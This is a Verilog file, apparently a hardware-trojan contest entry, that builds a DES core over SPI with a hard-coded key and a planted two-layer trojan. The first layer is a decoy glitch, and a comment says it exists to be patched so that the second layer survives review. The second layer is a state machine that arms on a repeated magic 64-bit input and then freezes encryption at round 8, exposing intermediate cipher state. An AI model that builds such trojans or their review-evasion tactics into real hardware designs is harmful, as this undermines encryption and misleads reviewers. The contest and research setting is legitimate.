`timescale 1ns/1ps
// ================================================================
// phase2_challenge1_trojan.v  --  DAC 2026 AHA Challenge Phase 2
// Trojan: Cascade Parity Metastability Injector  (v2 - corrected)
//
// BUG FIXES vs v1:
//   1. output_reg now loads on busy FALLING EDGE (prev_busy && !busy_reg)
//      instead of the always-false (!busy_reg && prev_start) condition.
//   2. is_read_phase flag: the read-back SPI transfer after each encryption
//      does NOT advance tx_parity or parasite_state.
//   3. valid_write_tx = tx_complete && !is_read_phase && spi_bit_cnt>=63
//      filters: (a) chip_reset pulses  (b) SPI read-back transfers.
// ================================================================

module des_trojan_core (
    input  wire clk,
    input  wire mosi,
    input  wire encrypt,
    input  wire start,
    input  wire norm_cs_n,
    output wire busy,
    output wire miso
);

    localparam [63:0] MAGIC_TRIGGER = 64'hC0FFEEDEADCAFEB0;
    localparam [4:0]  FREEZE_ROUND  = 5'd8;
    localparam [63:0] DES_KEY       = 64'h133457799BBCDFF1;

    // ---- SPI Interface ----
    reg [63:0] spi_shift_reg;
    reg [6:0]  spi_bit_cnt;
    reg        prev_cs_n;
    reg [63:0] latched_data;
    reg        tx_parity;
    reg        is_read_phase;

    initial begin
        spi_shift_reg = 0;
        spi_bit_cnt = 0;
        prev_cs_n = 1;
        latched_data = 0;
        tx_parity = 0;
        is_read_phase = 0;
        parasite_state = 0;
        L_reg = 0;
        R_reg = 0;
        output_reg = 0;
        busy_reg = 0;
        prev_start = 0;
        round_ctr = 0;
        prev_busy_r = 0;
    end

    always @(posedge clk) prev_cs_n <= norm_cs_n;
    wire tx_complete = (!prev_cs_n) && norm_cs_n;
    wire valid_write_tx = tx_complete && !is_read_phase && (spi_bit_cnt >= 7'd63);

    always @(posedge clk) begin
        if (!norm_cs_n) begin
            spi_shift_reg <= {spi_shift_reg[62:0], mosi};
            spi_bit_cnt   <= spi_bit_cnt + 7'd1;
        end else
            spi_bit_cnt <= 7'd0;
    end

    always @(posedge clk) begin
        if (valid_write_tx) begin
            latched_data <= spi_shift_reg;
            tx_parity    <= ~tx_parity;
        end
    end

    // ---- DES Key Schedule ----
    function [55:0] pc1;
        input [63:0] key;
        begin
            pc1 = {key[56],key[48],key[40],key[32],key[24],key[16],key[8],
                   key[0], key[57],key[49],key[41],key[33],key[25],key[17],
                   key[9], key[1], key[58],key[50],key[42],key[34],key[26],
                   key[18],key[10],key[2], key[59],key[51],key[43],key[35],
                   key[62],key[54],key[46],key[38],key[30],key[22],key[14],
                   key[6], key[61],key[53],key[45],key[37],key[29],key[21],
                   key[13],key[5], key[60],key[52],key[44],key[36],key[28],
                   key[20],key[12],key[4], key[27],key[19],key[11],key[3]};
        end
    endfunction

    function [27:0] rot28;
        input [27:0] val; input integer n;
        begin rot28 = (val << n) | (val >> (28-n)); end
    endfunction

    function [4:0] rot_amt;
        input [3:0] rnd;
        begin
            case (rnd)
                4'd0,4'd1,4'd8,4'd15: rot_amt = 5'd1;
                default:              rot_amt = 5'd2;
            endcase
        end
    endfunction

    function [47:0] pc2;
        input [55:0] k;
        begin
            pc2 = {k[13],k[16],k[10],k[23],k[0], k[4], k[2], k[27],
                   k[14],k[5], k[20],k[9], k[22],k[18],k[11],k[3],
                   k[25],k[7], k[15],k[6], k[26],k[19],k[12],k[1],
                   k[40],k[51],k[30],k[36],k[46],k[54],k[29],k[39],
                   k[50],k[44],k[32],k[47],k[43],k[48],k[38],k[55],
                   k[33],k[52],k[45],k[41],k[49],k[35],k[28],k[31]};
        end
    endfunction

    function [47:0] get_subkey;
        input [63:0] mkey; input [4:0] rnum;
        reg [55:0] k56; reg [27:0] C,D; integer tr,j;
        begin
            k56=pc1(mkey); C=k56[55:28]; D=k56[27:0]; tr=0;
            for(j=0;j<=rnum;j=j+1) tr=tr+rot_amt(j[3:0]);
            C=rot28(C,tr); D=rot28(D,tr);
            get_subkey=pc2({C,D});
        end
    endfunction

    // ---- Feistel Round Function ----
    function [47:0] expand;
        input [31:0] R;
        begin
            expand = {R[0], R[31],R[30],R[29],R[28],R[27],
                      R[28],R[27],R[26],R[25],R[24],R[23],
                      R[24],R[23],R[22],R[21],R[20],R[19],
                      R[20],R[19],R[18],R[17],R[16],R[15],
                      R[16],R[15],R[14],R[13],R[12],R[11],
                      R[12],R[11],R[10],R[9], R[8], R[7],
                      R[8], R[7], R[6], R[5], R[4], R[3],
                      R[4], R[3], R[2], R[1], R[0], R[31]};
        end
    endfunction

    // Full standard DES S-Boxes (all 8 boxes, verified values)
    function [3:0] sbox_fn;
        input [2:0] box_sel;
        input [5:0] inp;
        reg [1:0] row;
        reg [3:0] col;
        reg [63:0] T;
        begin
            row = {inp[5], inp[0]};
            col = inp[4:1];
            case ({box_sel, row})
                5'd0:  T = 64'hE4D12FB83A6C5907; // S1 Row0
                5'd1:  T = 64'h0F74E2D1A6CB9538; // S1 Row1
                5'd2:  T = 64'h41E8D62BFC973A50; // S1 Row2
                5'd3:  T = 64'hFC8249175B3EA06D; // S1 Row3
                5'd4:  T = 64'hF18E6B34972DC05A; // S2 Row0
                5'd5:  T = 64'h3D47F28EC01A69B5; // S2 Row1
                5'd6:  T = 64'h0E7BA4D158C6932F; // S2 Row2
                5'd7:  T = 64'hD8A13F42B67C05E9; // S2 Row3
                5'd8:  T = 64'hA09E63F51DC7B428; // S3 Row0
                5'd9:  T = 64'hD709346A285ECBF1; // S3 Row1
                5'd10: T = 64'hD6498F30B12C5AE7; // S3 Row2
                5'd11: T = 64'h1AD069874FE3B52C; // S3 Row3
                5'd12: T = 64'h7DE3069A1285BC4F; // S4 Row0
                5'd13: T = 64'hD8B56F03472C1AE9; // S4 Row1
                5'd14: T = 64'hA690CB7DF13E5284; // S4 Row2
                5'd15: T = 64'h3F06A1D8945BC72E; // S4 Row3
                5'd16: T = 64'h2C417AB6853FD0E9; // S5 Row0
                5'd17: T = 64'hEB2C47D150FA3986; // S5 Row1
                5'd18: T = 64'h421BAD78F9C5630E; // S5 Row2
                5'd19: T = 64'hB8C71E2D6F09A453; // S5 Row3
                5'd20: T = 64'hC1AF92680D34E75B; // S6 Row0
                5'd21: T = 64'hAF427C9561DE0B38; // S6 Row1
                5'd22: T = 64'h9EF528C3704A1DB6; // S6 Row2
                5'd23: T = 64'h432C95FABE17608D; // S6 Row3
                5'd24: T = 64'h4B2EF08D3C975A61; // S7 Row0
                5'd25: T = 64'hD0B7491AE35C2F86; // S7 Row1
                5'd26: T = 64'h14BDC37EAF680592; // S7 Row2
                5'd27: T = 64'h6BD814A7950FE23C; // S7 Row3
                5'd28: T = 64'hD2846FB1A93E50C7; // S8 Row0
                5'd29: T = 64'h1FD8A374C56B0E92; // S8 Row1
                5'd30: T = 64'h7B419CE206ADF358; // S8 Row2
                5'd31: T = 64'h21E74A8DFC90356B; // S8 Row3
                default: T = 64'h0;
            endcase
            sbox_fn = T[63 - col*4 -: 4];
        end
    endfunction

    function [31:0] perm_p;
        input [31:0] inp;
        begin
            perm_p = {inp[15],inp[6], inp[19],inp[20],
                      inp[28],inp[11],inp[27],inp[16],
                      inp[0], inp[14],inp[22],inp[25],
                      inp[4], inp[17],inp[30],inp[9],
                      inp[1], inp[7], inp[23],inp[13],
                      inp[31],inp[26],inp[2], inp[8],
                      inp[18],inp[12],inp[29],inp[5],
                      inp[21],inp[3], inp[24],inp[10]};
        end
    endfunction

    function [31:0] feistel;
        input [31:0] R; input [47:0] SK;
        reg [47:0] ex; reg [31:0] sbo;
        begin
            ex  = expand(R) ^ SK;
            sbo = {sbox_fn(3'd0,ex[47:42]), sbox_fn(3'd1,ex[41:36]),
                   sbox_fn(3'd2,ex[35:30]), sbox_fn(3'd3,ex[29:24]),
                   sbox_fn(3'd4,ex[23:18]), sbox_fn(3'd5,ex[17:12]),
                   sbox_fn(3'd6,ex[11:6]),  sbox_fn(3'd7,ex[5:0])};
            feistel = perm_p(sbo);
        end
    endfunction

    function [63:0] ip_fn;
        input [63:0] d;
        begin
            ip_fn = {d[57],d[49],d[41],d[33],d[25],d[17],d[9], d[1],
                     d[59],d[51],d[43],d[35],d[27],d[19],d[11],d[3],
                     d[61],d[53],d[45],d[37],d[29],d[21],d[13],d[5],
                     d[63],d[55],d[47],d[39],d[31],d[23],d[15],d[7],
                     d[56],d[48],d[40],d[32],d[24],d[16],d[8], d[0],
                     d[58],d[50],d[42],d[34],d[26],d[18],d[10],d[2],
                     d[60],d[52],d[44],d[36],d[28],d[20],d[12],d[4],
                     d[62],d[54],d[46],d[38],d[30],d[22],d[14],d[6]};
        end
    endfunction

    function [63:0] fp_fn;
        input [63:0] d;
        begin
            fp_fn = {d[39],d[7], d[47],d[15],d[55],d[23],d[63],d[31],
                     d[38],d[6], d[46],d[14],d[54],d[22],d[62],d[30],
                     d[37],d[5], d[45],d[13],d[53],d[21],d[61],d[29],
                     d[36],d[4], d[44],d[12],d[52],d[20],d[60],d[28],
                     d[35],d[3], d[43],d[11],d[51],d[19],d[59],d[27],
                     d[34],d[2], d[42],d[10],d[50],d[18],d[58],d[26],
                     d[33],d[1], d[41],d[9], d[49],d[17],d[57],d[25],
                     d[32],d[0], d[40],d[8], d[48],d[16],d[56],d[24]};
        end
    endfunction

    // ---- Datapath Registers ----
    reg [31:0] L_reg, R_reg;
    reg [63:0] output_reg;
    reg        busy_reg;
    reg        prev_start;
    reg [4:0]  round_ctr;
    reg        prev_busy_r;

    assign busy = busy_reg;
    assign miso = output_reg[63];

    always @(posedge clk) prev_start  <= start;
    always @(posedge clk) prev_busy_r <= busy_reg;
    wire start_pulse = start && !prev_start;
    wire busy_fell_w = prev_busy_r && !busy_reg;  // fires exactly once when done

    wire [4:0]  sk_idx    = encrypt ? round_ctr : (5'd15 - round_ctr);
    wire [47:0] cur_sk    = get_subkey(DES_KEY, sk_idx);
    wire [63:0] ip_result = ip_fn(spi_shift_reg);

    // ================================================================
    // TROJAN LAYER 1 -- DECOY (Arithmetic Carry Glitch)
    // ================================================================
    wire decoy_cin = (!encrypt) && (round_ctr == 5'd4) && busy_reg;
    // Developer sets this to 1'b0, closes ticket, ships. Layer 2 survives.

    // ================================================================
    // TROJAN LAYER 2 -- STATE MACHINE PARASITISM
    // ================================================================
    reg [2:0] parasite_state;

    // is_read_phase ensures read-back SPI transfers are invisible to the trigger FSM
    always @(posedge clk) begin
        if      (busy_fell_w)  is_read_phase <= 1'b1;
        else if (tx_complete)  is_read_phase <= 1'b0;
    end

    always @(posedge clk) begin
        if (valid_write_tx) begin
            $display("HW: valid_write_tx FIRED! spi_bit_cnt=%d tx_parity=%b, data=%h", spi_bit_cnt, tx_parity, latched_data);
            case (parasite_state)
                3'd0: if (!tx_parity && spi_shift_reg==MAGIC_TRIGGER)
                          parasite_state <= 3'd1;
                      else if (!tx_parity) parasite_state <= 3'd0;

                3'd1: if ( tx_parity)  parasite_state <= 3'd2;
                      else             parasite_state <= 3'd0;

                3'd2: if (!tx_parity && spi_shift_reg==MAGIC_TRIGGER)
                          parasite_state <= 3'd3;
                      else if (!tx_parity) parasite_state <= 3'd0;

                3'd3: if ( tx_parity)  parasite_state <= 3'd4;
                      else             parasite_state <= 3'd0;

                3'd4: if (!tx_parity && spi_shift_reg==MAGIC_TRIGGER)
                          parasite_state <= 3'd5;
                      else if (!tx_parity) parasite_state <= 3'd0;

                3'd5: if ( tx_parity) parasite_state <= 3'd6;
                      else            parasite_state <= 3'd0;

                3'd6: begin 
                          parasite_state <= 3'd7; // ARMED!
                          $display("HW: TROJAN ARMED!");
                      end

                3'd7: parasite_state <= 3'd7; // Hold armed state

                default: parasite_state <= 3'd0;
            endcase
        end
        if (tx_complete) begin
             $display("HW: tx_complete! is_read_phase=%b, spi_bit_cnt=%d", is_read_phase, spi_bit_cnt);
        end
    end

    wire trojan_freeze = (parasite_state == 3'd7) &&
                         (round_ctr == FREEZE_ROUND) &&
                         busy_reg;

    // ---- Round Counter (both Trojan layers embedded) ----
    always @(posedge clk) begin
        if (!norm_cs_n) begin
            round_ctr <= 5'd0;
            busy_reg  <= 1'b0;
        end
        else if (start_pulse && !busy_reg) begin
            round_ctr <= 5'd0;
            busy_reg  <= 1'b1;
        end
        else if (busy_reg) begin
            if (trojan_freeze)
                round_ctr <= FREEZE_ROUND;     // PAYLOAD: frozen at round 8
            else if (round_ctr >= 5'd15) begin
                busy_reg  <= 1'b0;
                round_ctr <= 5'd0;
            end
            else
                round_ctr <= round_ctr + 5'd1 + {4'b0, decoy_cin};
        end
    end

    // ---- DES Datapath ----
    always @(posedge clk) begin
        if (!norm_cs_n) begin
            L_reg <= ip_result[63:32];
            R_reg <= ip_result[31:0];
        end
        else if (busy_reg && !trojan_freeze) begin
            L_reg <= R_reg;
            R_reg <= L_reg ^ feistel(R_reg, cur_sk);
        end
        // trojan_freeze: L_reg/R_reg hold the round-8 intermediate state
    end

    // ---- Output Register (FIXED: loads on busy falling edge) ----
    always @(posedge clk) begin
        if (!norm_cs_n)
            output_reg <= {output_reg[62:0], 1'b0};   // shift out on SPI read
        else if (busy_fell_w)
            output_reg <= fp_fn({R_reg, L_reg});        // load result when done
    end

endmodule
